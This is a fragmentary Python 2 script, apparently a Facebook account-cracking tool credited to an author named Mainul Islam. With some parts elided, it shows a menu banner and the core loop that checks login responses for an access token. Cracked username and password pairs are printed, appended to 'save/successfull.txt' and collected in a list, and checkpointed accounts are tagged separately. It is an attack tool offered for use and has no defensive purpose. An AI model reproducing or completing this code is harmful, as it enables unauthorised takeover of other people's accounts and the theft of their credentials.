...
print("\033[0;91mThis Tool's By MAINUL")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : MAINUL ISLAM '
    print '\033[0;94mFACEBOOK : MD MAINUL ISLAM '
    print '\033[0;96mINSTA   : MAINUL-ISLAM420'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[M41NUL-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [M41NUL-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
